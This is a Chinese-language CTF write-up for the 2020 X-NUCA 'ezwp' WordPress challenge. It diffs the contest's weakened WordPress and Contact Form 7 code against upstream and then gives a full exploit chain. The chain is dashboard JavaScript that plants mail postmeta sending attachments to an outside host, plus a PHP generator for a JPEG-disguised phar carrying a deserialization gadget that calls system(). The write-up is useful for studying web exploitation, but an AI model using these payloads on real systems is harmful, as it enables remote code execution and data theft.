categories:
- 比赛
tags:
- web
- ctf
- wp
title: 2020xnuca_ezwp题解
---
# 2020 xnuca ezwp题解

wpscan扫一波发现wp是最新版本

本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这

漏洞分析：https://paper.seebug.org/774/

对wp和插件对比以下官方下载的，存在以下差异

## 文件对比



### wordpress

/wp-admin/includes/class-wp-screen.php 294行

------

官方

```
if ( isset( $_GET['post'] ) && isset( $_POST['post_ID'] ) && (int) $_GET['post'] !== (int) $_POST['post_ID'] ) {
						wp_die( __( 'A post ID mismatch has been detected.' ), __( 'Sorry, you are not allowed to edit this item.' ), 400 );
					} elseif ( isset( $_GET['post'] ) ) {
						$post_id = (int) $_GET['post'];
					} elseif ( isset( $_POST['post_ID'] ) ) {
						$post_id = (int) $_POST['post_ID'];
					} else {
						$post_id = 0;
					}
```

题目

```
if ( isset( $_GET['post'] ) ) {
						$post_id = (int) $_GET['post'];
					} elseif ( isset( $_POST['post_ID'] ) ) {
						$post_id = (int) $_POST['post_ID'];
					} else {
						$post_id = 0;
					}
```

------

/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）

官方

```
空
```

题目

```
if ( (stristr(file_get_contents($file['tmp_name']), "php") !== FALSE) ) {
        return call_user_func_array( $upload_error_handler, array( &$file, __( 'Sorry, this file content is not permitted for security reasons.' ) ) );
	}
```

------

/wp-admin/includes/post.php 221

array_diff_key 参数少了’file’

官方

```
return array_diff_key( $post_data, array_flip( array( 'meta_input', 'file', 'guid' ) ) );
```

题目

```
return array_diff_key( $post_data, array_flip( array( 'meta_input', 'guid' ) ) );
```

------

wp-admin/post.php 19行，少了很多条件

官方

```
if ( isset( $_GET['post'] ) && isset( $_POST['post_ID'] ) && (int) $_GET['post'] !== (int) $_POST['post_ID'] ) {
	wp_die( __( 'A post ID mismatch has been detected.' ), __( 'Sorry, you are not allowed to edit this item.' ), 400 );
} elseif ( isset( $_GET['post'] ) ) {
	$post_id = (int) $_GET['post'];
} elseif ( isset( $_POST['post_ID'] ) ) {
	$post_id = (int) $_POST['post_ID'];
} else {
	$post_id = 0;
}
```

题目

```
if ( isset( $_GET['post'] ) ) {
	$post_id = (int) $_GET['post'];
} elseif ( isset( $_POST['post_ID'] ) ) {
	$post_id = (int) $_POST['post_ID'];
} else {
	$post_id = 0;
}
```

wp-includes\Requests\Utility\FilteredIterator.php
删除了:

```
public function unserialize( $serialized ) {
	}

	/**
	 * @inheritdoc
	 */
	public function __unserialize( $serialized ) { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound
	}

	public function __wakeup() { // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound
		unset( $this->callback );
	}
```

### contact form 7

原来：
134行：

```
    return wp_mail( $recipient, $subject, $body, $headers, $attachments );
}
```

题目：

```
return $this->send_mail( $recipient, $subject, $body, $headers, $attachments );
	}

	public function send_mail($to, $subject, $message, $headers = '', $attachments = array()) {
	    try {
            $host = explode("@", $to)[1];
            $url = "http://$host";
            $post_data = array(
                "subject" => $subject,
                "message" => $message,
                "headers" => $headers
            );
            if ($attachments !== array()) {
                if (!empty($attachments[0])) {
                    $post_data["file"] = curl_file_create($attachments[0]);
                }
            }
            $ch = curl_init();
            curl_setopt($ch , CURLOPT_URL , $url);
            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch , CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);
			$data = curl_exec($ch);
			curl_close($ch);
			if ($data) {
				file_put_contents("/tmp/1.log", $data);
			}
            return true;
        } catch (Exception $e) {
            return false;
        }
    }
```





## 思路

跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell



## 绕过最新版本wp限制来利用历史漏洞

利用原来的payload直接打过去发现不太行，跟踪发现：

/wp-admin/includes/post.php 221：

`return array_diff_key( $post_data, array_flip( array( 'meta_input', 'guid' ) ) ); `

最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:

/wp-admin/includes/post.php 872：

`add_meta( $post_ID );`



```php
function add_meta( $post_ID ) {
	$post_ID = (int) $post_ID;

	$metakeyselect = isset( $_POST['metakeyselect'] ) ? wp_unslash( trim( $_POST['metakeyselect'] ) ) : '';
	$metakeyinput  = isset( $_POST['metakeyinput'] ) ? wp_unslash( trim( $_POST['metakeyinput'] ) ) : '';
	$metavalue     = isset( $_POST['metavalue'] ) ? $_POST['metavalue'] : '';
	if ( is_string( $metavalue ) ) {
		$metavalue = trim( $metavalue );
	}

	if ( ( ( '#NONE#' !== $metakeyselect ) && ! empty( $metakeyselect ) ) || ! empty( $metakeyinput ) ) {
		/*
		 * We have a key/value pair. If both the select and the input
		 * for the key have data, the input takes precedence.
		 */
		if ( '#NONE#' !== $metakeyselect ) {
			$metakey = $metakeyselect;
		}

		if ( $metakeyinput ) {
			$metakey = $metakeyinput; // Default.
		}

		if ( is_protected_meta( $metakey, 'post' ) || ! current_user_can( 'add_post_meta', $post_ID, $metakey ) ) {
			return false;
		}

		$metakey = wp_slash( $metakey );

		return add_post_meta( $post_ID, $metakey, $metavalue );
	}

	return false;
}
```



但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以`_`开头，按照原来的payload，到这里好像死路了。

但是我们跟踪以下插件渲染表单的代码发现



contact-form.php:129

class WPCF7_ContactForm

```php
private function __construct( $post = null ) {
		$post = get_post( $post );

		if ( $post && self::post_type == get_post_type( $post ) ) {
			$this->id = $post->ID;
			$this->name = $post->post_name;
			$this->title = $post->post_title;
			$this->locale = get_post_meta( $post->ID, '_locale', true );

			$properties = $this->get_properties();

			foreach ( $properties as $key => $value ) {
				if ( metadata_exists( 'post', $post->ID, '_' . $key ) ) {
					$properties[$key] = get_post_meta( $post->ID, '_' . $key, true );
				} elseif ( metadata_exists( 'post', $post->ID, $key ) ) {
					$properties[$key] = get_post_meta( $post->ID, $key, true );
				}
			}

			$this->properties = $properties;
			$this->upgrade();
		}

		do_action( 'wpcf7_contact_form', $this );
	}
```

contact form 的属性啥的就是从`$properties`中取出(`_mail`就在这里面)，想要利用历史漏洞我们必须能够控制`_mail`的值

`metadata_exists( 'post', $post->ID, '_' . $key )`:它先会去表中查找`"_"."mail"`这个属性，没有的话再去查找`"mail"`属性，正好我们前面找到一个可以控制非`_`开头的postmeta



于是构造

```javascript
var settings = {
    "async": true,
    "crossDomain": true,
    "url": "/wp-admin/post.php?post=1",
    "method": "POST",
    "data": {
        "_wpnonce": document.getElementById("_wpnonce").value,
        "_wp_http_referer": "%2Fwp-admin%2Fpost-new.php",
        "user_ID": "3",
        "action": "post",
        "originalaction": "editpost",
        "post_author": "3",
        "post_type": "wpcf7_contact_form",
        "original_post_status": "auto-draft",
        "auto_draft": "",
        "post_title": "readflagtotmp2log",
        "content": "test",
        "wp-preview": "",
        "hidden_post_status": "draft",
        "post_status": "draft",
        "hidden_post_password": "",
        "hidden_post_visibility": "public",
        "visibility": "public",
        "post_password": "",
        "mm": "12",
        "jj": "22",
        "_thumbnail_id": "-1",
        "advanced_view": "1",
        "comment_status": "open",
        "ping_status": "open",
        "post_name": "",
        "metakeyinput":"mail",
        "metavalue[subject]": "test \"[your-subject]\"",
        "metavalue[sender]": "2",
        "metavalue[recipient]": "ccreater@172.16.8.6:60000",
        "metavalue[body]": "From: [your-name] <[your-email]>\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n",
        "metavalue[additional_headers]": "Reply-To: [your-email]",
        "metavalue[attachments]": "phar://./wp-content/uploads/2020/12/phar.jpg",
        "metavalue[use_html]": "false",
        "metavalue[exclude_blank]": "false",
		"metakeyselect":"#NONE#"
        
    }
}
jQuery.ajax(settings).done(function (response) {
    console.log(response);
});
```

在dashboard那里执行这个js

成功写入`mail`:

![image8421](https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png)



因为没有`_form`属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交`jQuery(".wpcf7-form").submit()`，接着就可以读取文件和反序列化了



## 反序列化



```php
<?php

namespace Kigkonsult\Icalcreator{
    class Vtimezone{
        public $timezonetype;
        public $components;
        public function __construct($val)
        {
            $this->components = $val;
        }
    }
}
namespace {

	require( 'wp-load.php' );  //???????
	require_once( dirname( __FILE__ ) . '/wp-includes/Requests/Utility/FilteredIterator.php' );
	$arr  = array(
		"1" => "/readflag>/tmp/2.log"  //payload
	);
	$obj_ = new Requests_Utility_FilteredIterator( $arr, "system" );
	$obj  = new Kigkonsult\Icalcreator\Vtimezone( $obj_ );


	@unlink( "test.gif" );
	$phar = new Phar( "test.phar" );
	$phar->startBuffering();
	$phar->setStub( base64_decode( "/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE" ) . " __HALT_COMPILER(); ?>" );
	$phar->setMetadata( $obj );
	$phar->addFromString( "test.txt", "test" ); //????????
	//??????
	$phar->stopBuffering();
	rename( "test.phar", "test.gif" );
}

```

